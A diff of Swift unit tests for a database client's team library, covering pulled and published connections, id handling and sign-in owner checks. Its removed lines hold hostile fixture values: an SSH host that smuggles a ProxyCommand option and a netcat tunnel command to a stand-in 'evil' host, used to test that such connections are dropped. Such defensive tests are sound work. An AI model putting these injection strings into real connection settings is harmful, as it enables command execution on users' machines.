@@ -7,7 +7,6 @@ import Combine
 import Foundation
 @testable import TablePro
 import TableProFFI
-import TableProImport
 import TableProTestSupport
 import Testing
 
@@ -55,27 +54,38 @@ struct TeamLibraryTests {
         #expect(fixture.library.conflicts.writer(of: conflict.record) == "Grace Hopper")
     }
 
-    @Test("A connection whose SSH host ssh would refuse is dropped, and one that shows runs nothing by itself")
-    func pulledConnectionsRunNothing() async throws {
+    @Test("A connection the core read as none is dropped, and one it read shows as the library connection it is")
+    func pulledConnectionsShowAsTheCoreReadThem() async throws {
         let engine = FakeTeamLibraryEngine(teams: [TeamLibraryFixture.acme(items: [
-            TeamLibraryFixture.connection("c1", name: "Hostile", extra: [
-                "sshConfig": ["enabled": true, "host": "-oProxyCommand=touch /tmp/x", "port": 22, "username": "a", "authMethod": "password"]
-            ]),
-            TeamLibraryFixture.connection("c2", name: "Prod", extra: [
-                "startupCommands": "SET app.token = 'S3cret';",
-                "tunnelCommand": ["method": "custom", "command": "nc evil 1"]
-            ])
+            TeamLibraryFixture.connection("c1", name: "Hostile", readable: false),
+            TeamLibraryFixture.connection("c2", name: "Prod", additionalFields: ["connectTimeoutSeconds": "30"])
         ])])
         let fixture = try await TeamLibraryFixture(engine: engine)
 
         try await fixture.start()
         try await waitUntil { !fixture.library.content.connections.isEmpty }
 
-        let names = fixture.library.content.connections.map { $0.settings.name }
+        let names = fixture.library.content.connections.map { $0.connection.name }
         #expect(names == ["Prod"])
         let prod = try #require(fixture.library.content.connections.first)
-        #expect(prod.settings.startupCommands == nil)
-        #expect(prod.settings.tunnelCommand == nil)
+        #expect(prod.connection.type == .postgresql)
+        #expect(prod.connection.host == "db.internal")
+        #expect(prod.connection.port == 5_432)
+        #expect(prod.connection.additionalFields["connectTimeoutSeconds"] == "30")
+    }
+
+    @Test("A team's copy takes an id of its own, the same whatever case the team stores the item's id in")
+    func teamCopyTakesItsOwnID() throws {
+        let item = TeamLibraryFixture.connection("C9", name: "Prod")
+        let published = try #require(item.connection.flatMap { UUID(uuidString: $0.connection.id) })
+
+        let upper = try #require(TeamLibraryContent(teams: [TeamLibraryFixture.acme(items: [item])]).connections.first)
+        let lower = try #require(TeamLibraryContent(teams: [TeamLibraryFixture.acme(items: [
+            TeamLibraryFixture.connection("c9", name: "Prod")
+        ])]).connections.first)
+
+        #expect(upper.connection.id != published)
+        #expect(upper.connection.id == lower.connection.id)
     }
 
     @Test("A team that only reads shows its items, and is not a team to publish to")
@@ -105,7 +115,7 @@ struct TeamLibraryTests {
         engine.endSignIn()
         await fixture.library.refresh()
 
-        let names = fixture.library.content.connections.map { $0.settings.name }
+        let names = fixture.library.content.connections.map { $0.connection.name }
         #expect(names == ["Prod"])
         #expect(fixture.library.status == .failed(.signedOut))
     }
@@ -228,12 +238,12 @@ struct TeamLibraryTests {
 
     // MARK: - Publishing
 
-    @Test("Publishing sends each connection under its lowercase id, its settings without passwords or commands")
+    @Test("Publishing sends each connection as the library record the core stores it as")
     func publishSendsConnections() async throws {
         let fixture = try await TeamLibraryFixture()
         try await fixture.start()
         var prod = DatabaseConnection(name: "Prod", type: .postgresql)
-        prod.startupCommands = "SET app.token = 'S3cret';"
+        prod.additionalFields["connectTimeoutSeconds"] = "30"
         let staging = DatabaseConnection(name: "Staging")
 
         let result = try await fixture.library.publishConnections(
@@ -244,12 +254,8 @@ struct TeamLibraryTests {
         #expect(result == .published(1))
         let sent = try #require(fixture.engine.connectionPublishes.first)
         #expect(sent.team == TeamLibraryFixture.team)
-        let ids = sent.connections.map { $0.id }
-        #expect(ids == [prod.id, staging.id].map { $0.uuidString.lowercased() })
-        let settings = sent.connections.compactMap { TeamLibraryFixture.object($0.settingsJson) }
-        let names = settings.map { $0["name"] as? String }
-        #expect(names == ["Prod", "Staging"])
-        #expect(settings.allSatisfy { $0["startupCommands"] == nil && $0["tunnelCommand"] == nil && $0["password"] == nil })
+        #expect(sent.connections == [prod, staging].map { LibraryRecordMapping.record($0, keeping: nil) })
+        #expect(sent.connections.map { UUID(uuidString: $0.connection.id) } == [prod.id, staging.id])
     }
 
     @Test("Publishing saved queries sends every query and folder this Mac holds under lowercase ids")
@@ -282,6 +288,48 @@ struct TeamLibraryTests {
         #expect(throws: TeamLibraryPublishError.failed(.licenseExpired)) {
             try TeamLibrary.result(of: TeamPublishInfo(edits: 1, conflicts: 0, unsent: 1, problem: "sync.team_library.pull_only"))
         }
+    }
+
+    @Test("Every call names the owner of the sign-in shown")
+    func callsNameTheShownOwner() async throws {
+        let engine = FakeTeamLibraryEngine()
+        let fixture = try await TeamLibraryFixture(engine: engine)
+        try await fixture.start()
+
+        _ = try await fixture.library.publishConnections(
+            [DatabaseConnection(name: "Prod")],
+            to: fixture.library.destination(TeamLibraryFixture.team)
+        )
+        _ = await fixture.library.unsentChanges()
+        _ = await fixture.library.signOut(session: fixture.account.access.state.sessionID) {
+            [services = fixture.account.services] in await services.signOut()
+        }
+
+        #expect(!engine.namedOwners.isEmpty)
+        #expect(engine.namedOwners.allSatisfy { $0 == TeamLibraryFixture.owner })
+        #expect(engine.deletes == 1)
+    }
+
+    @Test("An engine of another owner shows nothing and takes no publish, which reads as signed out")
+    func anotherOwnersEngineRefusesEverything() async throws {
+        let other = TeamLibraryOwnerArg(apiOrigin: TeamLibraryFixture.owner.apiOrigin, accountId: "acct_other")
+        let engine = FakeTeamLibraryEngine(
+            teams: [TeamLibraryFixture.acme(items: [TeamLibraryFixture.connection("c1", name: "Theirs")])],
+            owner: other
+        )
+        let fixture = try await TeamLibraryFixture(engine: engine)
+        fixture.library.start()
+        try await waitUntil { fixture.library.status == .failed(.signedOut) }
+
+        await #expect(throws: TeamLibraryPublishError.self) {
+            try await fixture.library.publishConnections(
+                [DatabaseConnection(name: "Prod")],
+                to: fixture.library.destination(TeamLibraryFixture.team)
+            )
+        }
+
+        #expect(fixture.library.content == .empty)
+        #expect(engine.connectionPublishes.isEmpty)
     }
 
     @Test("A publish the engine refuses for the role reads as not writable, and one after the sign-in ended as signed out")
